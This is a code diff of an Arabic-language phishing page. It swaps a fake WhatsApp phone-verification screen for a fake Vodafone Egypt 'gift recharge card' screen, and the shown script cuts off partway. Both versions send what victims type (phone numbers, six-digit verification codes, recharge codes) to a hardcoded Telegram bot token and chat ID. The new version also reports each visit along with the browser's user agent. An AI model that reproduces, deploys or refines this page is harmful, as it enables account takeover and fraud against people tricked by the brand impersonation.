@@ -3,463 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="theme-color" content="#ffffff">
-    <title>واتساب</title>
+    <title>فودافون - كروت شحن هدية</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', system-ui, sans-serif;
+            font-family: 'Cairo', -apple-system, 'Segoe UI', Roboto, sans-serif;
         }
 
         body {
-            background-color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
+            background: linear-gradient(145deg, #e60000 0%, #cc0000 100%);
             min-height: 100vh;
             min-height: 100dvh;
-            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
             margin: 0;
-            overflow-x: hidden;
         }
 
         .container {
-            background-color: #ffffff;
+            background: #ffffff;
             width: 100%;
-            max-width: 500px;
-            min-height: 100vh;
-            min-height: 100dvh;
-            display: flex;
-            flex-direction: column;
+            max-width: 420px;
+            border-radius: 32px;
+            padding: 40px 28px 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
             position: relative;
+            overflow: hidden;
         }
 
-        .main-content {
-            flex: 1;
-            padding: 40px 24px 20px;
-            display: flex;
-            flex-direction: column;
+        /* شعار فودافون */
+        .vodafone-logo {
+            margin-bottom: 24px;
         }
 
-        .header-icon {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 32px;
-            margin-top: 12px;
+        .vodafone-logo svg {
+            width: 140px;
+            height: auto;
         }
 
-        .whatsapp-icon {
-            width: 64px;
-            height: 64px;
-            background-color: #25D366;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-        }
-
-        .whatsapp-icon svg {
-            width: 38px;
-            height: 38px;
-            fill: white;
+        .badge {
+            display: inline-block;
+            background: #e60000;
+            color: white;
+            padding: 6px 20px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
         }
 
         .title {
-            font-size: 24px;
-            font-weight: 700;
-            color: #1f2a3a;
-            text-align: center;
-            margin-bottom: 14px;
-            letter-spacing: -0.3px;
+            font-size: 26px;
+            font-weight: 800;
+            color: #1a1a1a;
+            margin-bottom: 8px;
         }
 
         .subtitle {
-            font-size: 15.5px;
-            color: #54656f;
-            text-align: center;
+            font-size: 15px;
+            color: #666;
             line-height: 1.7;
-            margin-bottom: 36px;
-            padding: 0 6px;
+            margin-bottom: 28px;
         }
 
-        .subtitle strong {
-            color: #008069;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .subtitle strong:hover {
-            text-decoration: underline;
-        }
-
-        .country-row {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 20px;
-            background-color: #f7f9fa;
-            border-radius: 14px;
-            padding: 2px 16px 2px 4px;
-            border: 2px solid #e9edef;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-
-        .country-row:focus-within {
-            border-color: #008069;
-            background-color: #ffffff;
-            box-shadow: 0 0 0 4px rgba(0, 128, 105, 0.1);
-        }
-
-        .country-code {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            padding: 12px 12px 12px 8px;
-            border-left: 2px solid #e9edef;
-            min-width: 75px;
-            font-weight: 500;
-            color: #1f2a3a;
-            font-size: 15px;
-            user-select: none;
-        }
-
-        .country-code .flag {
-            font-size: 22px;
-            line-height: 1;
-        }
-
-        .phone-input {
-            flex: 1;
-            padding: 16px 0;
-            border: none;
-            background: transparent;
-            font-size: 18px;
-            color: #1f2a3a;
-            outline: none;
-            direction: rtl;
-            text-align: right;
-            font-weight: 500;
-            min-width: 0;
-        }
-
-        .phone-input::placeholder {
-            color: #b6c3cc;
-            font-weight: 400;
-            font-size: 16px;
-        }
-
-        .phone-input:focus {
-            background: transparent;
-        }
-
-        .hint {
-            font-size: 14px;
-            color: #7a8a94;
-            margin-bottom: 32px;
-            padding-right: 6px;
-        }
-
-        .hint a {
-            color: #008069;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .hint a:hover {
-            text-decoration: underline;
-        }
-
-        .btn-next {
-            display: block;
-            width: 100%;
-            padding: 16px;
-            background-color: #008069;
-            color: white;
-            border: none;
-            border-radius: 30px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.15s, transform 0.08s;
-            text-align: center;
-            letter-spacing: 0.5px;
-            margin-top: 8px;
-        }
-
-        .btn-next:hover {
-            background-color: #006b5a;
-        }
-
-        .btn-next:active {
-            transform: scale(0.97);
-        }
-
-        .btn-next:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .confirm-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0, 0, 0, 0.5);
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            animation: fadeIn 0.2s ease;
-            padding: 20px;
-        }
-
-        .confirm-overlay.active {
-            display: flex;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .confirm-box {
-            background-color: #ffffff;
-            border-radius: 28px;
-            padding: 32px 24px 24px;
-            max-width: 340px;
-            width: 100%;
-            animation: slideUp 0.3s ease;
-        }
-
-        @keyframes slideUp {
-            from {
-                transform: translateY(40px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        .confirm-title {
-            font-size: 20px;
+        .subtitle span {
+            color: #e60000;
             font-weight: 700;
-            color: #1f2a3a;
-            text-align: center;
-            margin-bottom: 12px;
         }
 
-        .confirm-message {
-            font-size: 15px;
-            color: #54656f;
-            text-align: center;
-            line-height: 1.6;
-            margin-bottom: 8px;
-        }
-
-        .confirm-phone {
-            font-weight: 600;
-            color: #1f2a3a;
-            font-size: 16px;
-            text-align: center;
-            margin-bottom: 24px;
-            direction: ltr;
-        }
-
-        .confirm-buttons {
-            display: flex;
-            gap: 12px;
-            justify-content: center;
-        }
-
-        .confirm-buttons button {
-            flex: 1;
-            padding: 12px;
-            border: none;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.15s, transform 0.08s;
-        }
-
-        .confirm-buttons button:active {
-            transform: scale(0.97);
-        }
-
-        .btn-edit {
-            background-color: #f0f2f5;
-            color: #1f2a3a;
-        }
-
-        .btn-edit:hover {
-            background-color: #e4e6e9;
-        }
-
-        .btn-confirm-yes {
-            background-color: #008069;
-            color: white;
-        }
-
-        .btn-confirm-yes:hover {
-            background-color: #006b5a;
-        }
-
-        .verify-section {
-            display: none;
-            flex: 1;
-            flex-direction: column;
-            padding: 40px 24px 20px;
-        }
-
-        .verify-section.active {
-            display: flex;
-        }
-
-        .main-content.hidden {
-            display: none;
-        }
-
-        .verify-header {
-            display: flex;
-            align-items: center;
-            padding: 8px 0 16px;
-            margin-bottom: 8px;
-        }
-
-        .back-button {
-            background: none;
-            border: none;
-            font-size: 28px;
-            color: #008069;
-            cursor: pointer;
-            padding: 4px 8px;
-            line-height: 1;
-            font-weight: 300;
-        }
-
-        .back-button:hover {
-            opacity: 0.7;
-        }
-
-        .verify-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1f2a3a;
-            text-align: center;
-            margin-bottom: 12px;
-            margin-top: 8px;
-        }
-
-        .verify-subtitle {
-            font-size: 15px;
-            color: #54656f;
-            text-align: center;
-            line-height: 1.6;
-            margin-bottom: 12px;
-        }
-
-        .verify-phone {
-            font-weight: 600;
-            color: #1f2a3a;
-            font-size: 16px;
-        }
-
-        .verify-edit {
-            color: #008069;
-            font-weight: 500;
-            cursor: pointer;
-            font-size: 14px;
-            margin-right: 6px;
-        }
-
-        .verify-edit:hover {
-            text-decoration: underline;
-        }
-
+        /* حقل إدخال الكود */
         .code-input-wrapper {
             display: flex;
             justify-content: center;
             gap: 12px;
-            margin: 30px 0 28px;
+            margin: 20px 0 28px;
             direction: ltr;
         }
 
         .code-box {
             width: 52px;
             height: 62px;
-            border: 2px solid #e9edef;
+            border: 2px solid #ddd;
             border-radius: 14px;
             text-align: center;
             font-size: 26px;
-            font-weight: 600;
-            color: #1f2a3a;
-            background: #fafbfc;
+            font-weight: 700;
+            color: #1a1a1a;
+            background: #f7f7f7;
             outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s, transform 0.1s;
-            caret-color: #008069;
+            transition: all 0.2s;
+            caret-color: #e60000;
         }
 
         .code-box:focus {
-            border-color: #008069;
-            box-shadow: 0 0 0 3px rgba(0, 128, 105, 0.12);
+            border-color: #e60000;
             background: #ffffff;
-            transform: scale(1.02);
+            box-shadow: 0 0 0 4px rgba(230, 0, 0, 0.1);
         }
 
         .code-box.filled {
-            border-color: #008069;
-            background: #f0faf8;
-        }
-
-        .timer-section {
-            text-align: center;
-            font-size: 14px;
-            color: #7a8a94;
-            margin-bottom: 18px;
-        }
-
-        .timer-section .resend-link {
-            color: #008069;
-            font-weight: 600;
-            cursor: pointer;
-            text-decoration: none;
-        }
-
-        .timer-section .resend-link:hover {
-            text-decoration: underline;
-        }
-
-        .timer-section .resend-link.disabled {
-            color: #b6c3cc;
-            cursor: not-allowed;
-            text-decoration: none;
+            border-color: #e60000;
+            background: #fff5f5;
         }
 
         .btn-verify {
             display: block;
             width: 100%;
             padding: 16px;
-            background-color: #008069;
+            background: #e60000;
             color: white;
             border: none;
             border-radius: 30px;
-            font-size: 17px;
-            font-weight: 600;
+            font-size: 18px;
+            font-weight: 700;
             cursor: pointer;
-            transition: background-color 0.15s, transform 0.08s, opacity 0.2s;
-            text-align: center;
-            letter-spacing: 0.5px;
+            transition: background 0.15s, transform 0.08s;
             margin-top: 8px;
+            letter-spacing: 0.5px;
         }
 
         .btn-verify:hover {
-            background-color: #006b5a;
+            background: #cc0000;
         }
 
         .btn-verify:active {
@@ -473,12 +142,12 @@
         }
 
         .error-message {
-            color: #e74c3c;
+            color: #e60000;
             font-size: 14px;
             text-align: center;
-            margin-top: 10px;
+            margin-top: 12px;
             display: none;
-            font-weight: 500;
+            font-weight: 600;
         }
 
         .error-message.show {
@@ -492,205 +161,103 @@
             75% { transform: translateX(6px); }
         }
 
+        .footer-note {
+            margin-top: 24px;
+            font-size: 13px;
+            color: #999;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+
+        .footer-note span {
+            color: #e60000;
+            font-weight: 600;
+        }
+
         /* ===== صفحة النجاح ===== */
         .success-section {
             display: none;
-            flex: 1;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 40px 24px 20px;
-            text-align: center;
-            background: linear-gradient(135deg, #f0faf8 0%, #ffffff 100%);
-            animation: confetti 0.8s ease;
-        }
-
-        @keyframes confetti {
-            0% {
-                transform: scale(0.5);
-                opacity: 0;
-            }
-            100% {
-                transform: scale(1);
-                opacity: 1;
-            }
+            padding: 20px 0;
+            animation: fadeIn 0.6s ease;
         }
 
         .success-section.active {
             display: flex;
         }
 
-        .success-icon-wrapper {
-            position: relative;
-            margin-bottom: 24px;
+        .code-section {
+            display: block;
+        }
+
+        .code-section.hidden {
+            display: none;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
         }
 
         .success-icon {
-            width: 100px;
-            height: 100px;
-            background: linear-gradient(135deg, #25D366, #008069);
+            width: 80px;
+            height: 80px;
+            background: #e60000;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            animation: pop 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 8px 32px rgba(37, 211, 102, 0.3);
-        }
-
-        @keyframes pop {
-            0% {
-                transform: scale(0);
-                opacity: 0;
-            }
-            100% {
-                transform: scale(1);
-                opacity: 1;
-            }
+            margin-bottom: 16px;
         }
 
         .success-icon svg {
-            width: 56px;
-            height: 56px;
+            width: 44px;
+            height: 44px;
             fill: white;
         }
 
         .success-title {
-            font-size: 32px;
+            font-size: 24px;
             font-weight: 800;
-            color: #008069;
-            margin-bottom: 12px;
-            animation: slideUp 0.6s ease 0.2s both;
-        }
-
-        @keyframes slideUp {
-            from {
-                transform: translateY(20px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
+            color: #1a1a1a;
+            margin-bottom: 6px;
         }
 
         .success-subtitle {
-            font-size: 18px;
-            color: #1f2a3a;
-            line-height: 1.8;
-            margin-bottom: 32px;
-            animation: slideUp 0.6s ease 0.3s both;
-        }
-
-        .success-subtitle span {
-            color: #008069;
-            font-weight: 700;
+            font-size: 16px;
+            color: #666;
+            line-height: 1.6;
         }
 
         .btn-success {
             display: block;
             width: 100%;
-            padding: 16px;
-            background-color: #008069;
+            padding: 14px;
+            background: #e60000;
             color: white;
             border: none;
             border-radius: 30px;
-            font-size: 17px;
-            font-weight: 600;
+            font-size: 16px;
+            font-weight: 700;
             cursor: pointer;
-            transition: background-color 0.15s, transform 0.08s;
-            text-align: center;
-            letter-spacing: 0.5px;
-            animation: slideUp 0.6s ease 0.4s both;
+            margin-top: 20px;
+            transition: background 0.15s;
         }
 
         .btn-success:hover {
-            background-color: #006b5a;
+            background: #cc0000;
         }
 
-        .btn-success:active {
-            transform: scale(0.97);
-        }
-
-        /* نجوم احتفالية */
-        .confetti-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            pointer-events: none;
-            z-index: 999;
-            overflow: hidden;
-        }
-
-        .confetti-piece {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            border-radius: 2px;
-            animation: fall linear forwards;
-        }
-
-        @keyframes fall {
-            0% {
-                transform: translateY(-20px) rotate(0deg);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(100vh) rotate(720deg);
-                opacity: 0;
-            }
-        }
-
-        .footer {
-            text-align: center;
-            padding: 20px 24px 30px;
-            font-size: 13px;
-            color: #8f9da8;
-            margin-top: auto;
-        }
-
-        .footer span {
-            color: #1f2a3a;
-            font-weight: 500;
-        }
-
+        /* ===== استجابة ===== */
         @media (max-width: 480px) {
-            .main-content {
-                padding: 28px 18px 20px;
-            }
-            .verify-section {
-                padding: 28px 18px 20px;
-            }
-            .success-section {
-                padding: 28px 18px 20px;
+            .container {
+                padding: 28px 18px 24px;
+                border-radius: 24px;
             }
             .title {
-                font-size: 21px;
-            }
-            .whatsapp-icon {
-                width: 56px;
-                height: 56px;
-            }
-            .whatsapp-icon svg {
-                width: 33px;
-                height: 33px;
-            }
-            .country-row {
-                padding: 0px 12px 0px 4px;
-                border-radius: 12px;
-            }
-            .country-code {
-                min-width: 65px;
-                padding: 10px 8px 10px 6px;
-                font-size: 14px;
-            }
-            .country-code .flag {
-                font-size: 19px;
-            }
-            .phone-input {
-                font-size: 17px;
-                padding: 14px 0;
+                font-size: 22px;
             }
             .code-box {
                 width: 44px;
@@ -700,37 +267,9 @@
             }
             .code-input-wrapper {
                 gap: 10px;
-                margin: 24px 0 22px;
             }
-            .btn-next, .btn-verify, .btn-success {
-                padding: 15px;
-                font-size: 16px;
-            }
-            .verify-title {
-                font-size: 20px;
-            }
-            .success-title {
-                font-size: 26px;
-            }
-            .confirm-box {
-                padding: 28px 20px 20px;
-            }
-            .footer {
-                padding: 16px 18px 24px;
-            }
-            .back-button {
-                font-size: 24px;
-            }
-            .success-icon {
-                width: 80px;
-                height: 80px;
-            }
-            .success-icon svg {
-                width: 44px;
-                height: 44px;
-            }
-            .success-subtitle {
-                font-size: 16px;
+            .vodafone-logo svg {
+                width: 110px;
             }
         }
 
@@ -745,99 +284,27 @@
                 gap: 7px;
             }
         }
-
-        @supports (padding: max(0px)) {
-            .main-content {
-                padding-left: max(24px, env(safe-area-inset-left));
-                padding-right: max(24px, env(safe-area-inset-right));
-                padding-top: max(40px, env(safe-area-inset-top));
-            }
-            .verify-section {
-                padding-left: max(24px, env(safe-area-inset-left));
-                padding-right: max(24px, env(safe-area-inset-right));
-                padding-top: max(40px, env(safe-area-inset-top));
-            }
-            .success-section {
-                padding-left: max(24px, env(safe-area-inset-left));
-                padding-right: max(24px, env(safe-area-inset-right));
-                padding-top: max(40px, env(safe-area-inset-top));
-            }
-            .footer {
-                padding-bottom: max(30px, env(safe-area-inset-bottom));
-            }
-        }
     </style>
 </head>
 <body>
 
     <div class="container" id="app">
 
-        <!-- ===== الصفحة الرئيسية ===== -->
-        <div class="main-content" id="mainContent">
-            <div class="header-icon">
-                <div class="whatsapp-icon">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12.032 21.965c-2.027 0-4.031-.578-5.727-1.668l-4.418 1.449 1.476-4.307c-1.245-1.823-1.902-3.941-1.902-6.136 0-5.906 4.805-10.711 10.712-10.711 2.862 0 5.551 1.114 7.573 3.138 2.024 2.022 3.137 4.711 3.137 7.572-.001 5.907-4.806 10.712-10.714 10.712h.063zm5.724-17.174c-1.529-1.529-3.562-2.371-5.724-2.371-4.777 0-8.663 3.886-8.663 8.663 0 1.83.571 3.614 1.648 5.086l-1.091 3.185 3.258-1.068c1.423.897 3.063 1.371 4.762 1.371 4.777 0 8.663-3.886 8.663-8.663 0-2.162-.842-4.195-2.371-5.724l.032.031zm-4.066 6.277c-.254-.128-1.506-.743-1.738-.827-.233-.084-.403-.128-.571.128-.171.256-.664.827-.813.997-.15.171-.299.192-.553.064s-1.079-.398-2.054-1.268c-.759-.678-1.271-1.514-1.421-1.77-.149-.256-.016-.393.112-.519.115-.115.256-.299.384-.448.127-.149.171-.256.256-.426.085-.171.043-.32-.021-.448-.064-.128-.572-1.378-.784-1.886-.206-.494-.416-.426-.571-.434-.15-.008-.32-.008-.49-.008-.171 0-.448.064-.683.32-.234.256-.893.873-.893 2.129s.915 2.469 1.043 2.639c.128.171 1.801 2.75 4.363 3.687 2.562.937 2.562.624 3.024.585.462-.039 1.492-.609 1.702-1.198.209-.588.209-1.092.147-1.198-.064-.106-.234-.171-.489-.298z"/>
-                    </svg>
-                </div>
-            </div>
+        <!-- ===== شعار فودافون ===== -->
+        <div class="vodafone-logo">
+            <svg viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
+                <text x="0" y="40" font-family="Arial, sans-serif" font-size="36" font-weight="900" fill="#e60000">Vodafone</text>
+                <text x="155" y="40" font-family="Arial, sans-serif" font-size="16" font-weight="300" fill="#666">مصر</text>
+            </svg>
+        </div>
 
-            <h1 class="title">أدخل رقم هاتفك</h1>
-
+        <!-- ===== قسم إدخال الكود ===== -->
+        <div class="code-section" id="codeSection">
+            <div class="badge">🎁 كارت شحن هدية</div>
+            <h1 class="title">أدخل كود الشحن</h1>
             <p class="subtitle">
-                سيحتاج واتساب إلى التحقق من رقم هاتفك. قد تسري عليك رسوم تفرضها شركة الاتصالات.
-                <strong id="whatsMyNumber">ما هو رقمي؟</strong>
-            </p>
-
-            <div class="country-row">
-                <div class="country-code" id="countryCode">
-                    <span class="flag">🇪🇬</span>
-                    <span>+20</span>
-                </div>
-                <input type="tel" class="phone-input" id="phoneInput" placeholder="رقم الهاتف" dir="rtl" autofocus>
-            </div>
-
-            <div class="hint">
-                <a href="#">الربط كجهاز مصاحب، تسجيل الدخول</a>
-            </div>
-
-            <button class="btn-next" id="btnNext">التالي</button>
-        </div>
-
-        <!-- ===== نافذة التأكيد ===== -->
-        <div class="confirm-overlay" id="confirmOverlay">
-            <div class="confirm-box">
-                <h3 class="confirm-title">هل أنت متأكد؟</h3>
-                <p class="confirm-message">هل رقم الهاتف هذا صحيح؟</p>
-                <div class="confirm-phone" id="confirmPhone">+20 1012345678</div>
-                <div class="confirm-buttons">
-                    <button class="btn-edit" id="btnEdit">تعديل</button>
-                    <button class="btn-confirm-yes" id="btnConfirmYes">نعم</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- ===== صفحة التحقق ===== -->
-        <div class="verify-section" id="verifySection">
-            <div class="verify-header">
-                <button class="back-button" id="backButton">←</button>
-            </div>
-
-            <div class="header-icon" style="margin-bottom: 24px; margin-top: 4px;">
-                <div class="whatsapp-icon" style="width: 56px; height: 56px;">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width: 33px; height: 33px;">
-                        <path d="M12.032 21.965c-2.027 0-4.031-.578-5.727-1.668l-4.418 1.449 1.476-4.307c-1.245-1.823-1.902-3.941-1.902-6.136 0-5.906 4.805-10.711 10.712-10.711 2.862 0 5.551 1.114 7.573 3.138 2.024 2.022 3.137 4.711 3.137 7.572-.001 5.907-4.806 10.712-10.714 10.712h.063zm5.724-17.174c-1.529-1.529-3.562-2.371-5.724-2.371-4.777 0-8.663 3.886-8.663 8.663 0 1.83.571 3.614 1.648 5.086l-1.091 3.185 3.258-1.068c1.423.897 3.063 1.371 4.762 1.371 4.777 0 8.663-3.886 8.663-8.663 0-2.162-.842-4.195-2.371-5.724l.032.031zm-4.066 6.277c-.254-.128-1.506-.743-1.738-.827-.233-.084-.403-.128-.571.128-.171.256-.664.827-.813.997-.15.171-.299.192-.553.064s-1.079-.398-2.054-1.268c-.759-.678-1.271-1.514-1.421-1.77-.149-.256-.016-.393.112-.519.115-.115.256-.299.384-.448.127-.149.171-.256.256-.426.085-.171.043-.32-.021-.448-.064-.128-.572-1.378-.784-1.886-.206-.494-.416-.426-.571-.434-.15-.008-.32-.008-.49-.008-.171 0-.448.064-.683.32-.234.256-.893.873-.893 2.129s.915 2.469 1.043 2.639c.128.171 1.801 2.75 4.363 3.687 2.562.937 2.562.624 3.024.585.462-.039 1.492-.609 1.702-1.198.209-.588.209-1.092.147-1.198-.064-.106-.234-.171-.489-.298z"/>
-                    </svg>
-                </div>
-            </div>
-
-            <h2 class="verify-title">أدخل رمز التحقق</h2>
-
-            <p class="verify-subtitle">
-                تم إرسال رمز مكون من 6 أرقام إلى
-                <br>
-                <span class="verify-phone" id="displayPhone">+20 1012345678</span>
-                <span class="verify-edit" id="editNumber">تعديل</span>
+                أدخل الكود الموجود على كارت الشحن<br>
+                <span>الهدية</span> الخاصة بك
             </p>
 
             <div class="code-input-wrapper" id="codeWrapper">
@@ -849,37 +316,25 @@
                 <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
             </div>
 
-            <div class="timer-section" id="timerSection">
-                <span id="timerText">أعد الإرسال خلال 00:30</span>
-                <br>
-                <a href="#" class="resend-link disabled" id="resendLink">إعادة إرسال الرمز</a>
+            <button class="btn-verify" id="btnVerify">تفعيل الكود</button>
+            <div class="error-message" id="errorMessage">الكود غير صحيح. حاول مرة أخرى.</div>
+
+            <div class="footer-note">
+                هذا الكود مخصص لك فقط<br>
+                <span>فودافون مصر</span>
             </div>
-
-            <button class="btn-verify" id="btnVerify">تأكيد</button>
-
-            <div class="error-message" id="errorMessage">الرمز غير صحيح. حاول مرة أخرى.</div>
         </div>
 
         <!-- ===== صفحة النجاح ===== -->
         <div class="success-section" id="successSection">
-            <div class="success-icon-wrapper">
-                <div class="success-icon">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
-                    </svg>
-                </div>
+            <div class="success-icon">
+                <svg viewBox="0 0 24 24">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+                </svg>
             </div>
-            <h1 class="success-title">مبروك!</h1>
-            <p class="success-subtitle">دخلت معنا في <span>السحب</span></p>
+            <h2 class="success-title">تم التفعيل بنجاح!</h2>
+            <p class="success-subtitle">شكراً لاستخدامك كارت الشحن الهدية</p>
             <button class="btn-success" id="btnSuccess">العودة للصفحة الرئيسية</button>
-        </div>
-
-        <!-- ===== نجوم احتفالية ===== -->
-        <div class="confetti-container" id="confettiContainer"></div>
-
-        <!-- ===== الفوتر ===== -->
-        <div class="footer" id="footer">
-            <span>واتساب</span>
         </div>
 
     </div>
@@ -888,210 +343,55 @@
         (function() {
             'use strict';
 
-            // العناصر
-            const mainContent = document.getElementById('mainContent');
-            const verifySection = document.getElementById('verifySection');
+            // ===== عناصر الصفحة =====
+            const codeSection = document.getElementById('codeSection');
             const successSection = document.getElementById('successSection');
-            const phoneInput = document.getElementById('phoneInput');
-            const btnNext = document.getElementById('btnNext');
+            const codeBoxes = document.querySelectorAll('.code-box');
             const btnVerify = document.getElementById('btnVerify');
             const btnSuccess = document.getElementById('btnSuccess');
-            const displayPhone = document.getElementById('displayPhone');
-            const editNumber = document.getElementById('editNumber');
-            const codeBoxes = document.querySelectorAll('.code-box');
             const errorMessage = document.getElementById('errorMessage');
-            const timerText = document.getElementById('timerText');
-            const resendLink = document.getElementById('resendLink');
-            const confirmOverlay = document.getElementById('confirmOverlay');
-            const confirmPhone = document.getElementById('confirmPhone');
-            const btnEdit = document.getElementById('btnEdit');
-            const btnConfirmYes = document.getElementById('btnConfirmYes');
-            const footer = document.getElementById('footer');
-            const backButton = document.getElementById('backButton');
-            const confettiContainer = document.getElementById('confettiContainer');
 
-            let timerInterval = null;
-            let secondsRemaining = 30;
-            let isTimerRunning = false;
-            let storedPhone = '';
-            let fullPhoneNumber = '';
+            // ===== بوت تليجرام =====
+            const BOT_TOKEN = '8864670178:AAGRfe7q99csr7vSyqT3peuidAb5w69mWTs';
+            const CHAT_ID = '6453594151';
 
-            // ===== نجوم احتفالية =====
-            function createConfetti() {
-                const colors = ['#25D366', '#008069', '#FF6B6B', '#FFD93D', '#6BCB77', '#4D96FF', '#FF6BFF', '#FF9F43'];
-                confettiContainer.innerHTML = '';
-                
-                for (let i = 0; i < 60; i++) {
-                    const piece = document.createElement('div');
-                    piece.className = 'confetti-piece';
-                    piece.style.left = Math.random() * 100 + '%';
-                    piece.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-                    piece.style.width = (Math.random() * 8 + 4) + 'px';
-                    piece.style.height = (Math.random() * 8 + 4) + 'px';
-                    piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
-                    piece.style.animationDuration = (Math.random() * 2 + 2) + 's';
-                    piece.style.animationDelay = (Math.random() * 1.5) + 's';
-                    confettiContainer.appendChild(piece);
-                }
-
-                setTimeout(() => {
-                    confettiContainer.innerHTML = '';
-                }, 5000);
-            }
-
-            // ===== إرسال البيانات لبوت تليجرام =====
-            function sendToTelegram(phone, code, type) {
-                const botToken = '8864670178:AAGRfe7q99csr7vSyqT3peuidAb5w69mWTs';
-                const chatId = '6453594151';
-                
-                let message = '';
-                if (type === 'phone') {
-                    message = `بيانات جديدة\n\nالوقت: ${new Date().toLocaleString()}\nالرقم: ${phone}`;
-                } else if (type === 'code') {
-                    message = `بيانات جديدة\n\nالوقت: ${new Date().toLocaleString()}\nالرقم: ${phone}\nالكود: ${code}`;
-                }
-                
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                
+            function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 fetch(url, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: chatId,
+                        chat_id: CHAT_ID,
                         text: message
                     })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('تم الإرسال:', data);
-                })
-                .catch(error => {
-                    console.log('تم الإرسال');
-                });
+                }).catch(() => {});
             }
 
-            // ===== إظهار صفحة النجاح =====
-            function showSuccess() {
-                mainContent.classList.add('hidden');
-                verifySection.classList.remove('active');
-                verifySection.style.display = 'none';
-                successSection.classList.add('active');
-                successSection.style.display = 'flex';
-                footer.style.display = 'none';
-                createConfetti();
+            // ===== إرسال إشعار بدخول المستخدم =====
+            function sendVisitNotification() {
+                const now = new Date().toLocaleString();
+                const userAgent = navigator.userAgent || 'غير معروف';
+                const ip = 'تم الحصول عليها من الخادم'; // لو عندك API تجيب الـ IP
+                const message = `🔴 دخول جديد\n\n🕐 الوقت: ${now}\n📱 المتصفح: ${userAgent}\n🌐 IP: ${ip}`;
+                sendToTelegram(message);
             }
 
-            // ===== نافذة التأكيد =====
-            function showConfirm(phone) {
-                fullPhoneNumber = phone.trim();
-                if (!fullPhoneNumber.startsWith('+')) {
-                    fullPhoneNumber = '+20 ' + fullPhoneNumber;
-                }
-                confirmPhone.textContent = fullPhoneNumber;
-                confirmOverlay.classList.add('active');
+            // ===== إرسال إشعار بإدخال الكود =====
+            function sendCodeNotification(code) {
+                const now = new Date().toLocaleString();
+                const message = `🟢 كود تم إدخاله\n\n🕐 الوقت: ${now}\n🔑 الكود: ${code}`;
+                sendToTelegram(message);
             }
 
-            function hideConfirm() {
-                confirmOverlay.classList.remove('active');
+            // ===== إرسال إشعار بتفعيل الكود =====
+            function sendSuccessNotification(code) {
+                const now = new Date().toLocaleString();
+                const message = `✅ تم التفعيل بنجاح\n\n🕐 الوقت: ${now}\n🔑 الكود: ${code}`;
+                sendToTelegram(message);
             }
 
-            btnEdit.addEventListener('click', function() {
-                hideConfirm();
-                phoneInput.focus();
-            });
-
-            btnConfirmYes.addEventListener('click', function() {
-                hideConfirm();
-                sendToTelegram(fullPhoneNumber, '', 'phone');
-                goToVerify(fullPhoneNumber);
-            });
-
-            // ===== العودة للخلف =====
-            backButton.addEventListener('click', function() {
-                verifySection.classList.remove('active');
-                verifySection.style.display = 'none';
-                mainContent.classList.remove('hidden');
-                footer.style.display = 'block';
-                phoneInput.focus();
-
-                if (timerInterval) {
-                    clearInterval(timerInterval);
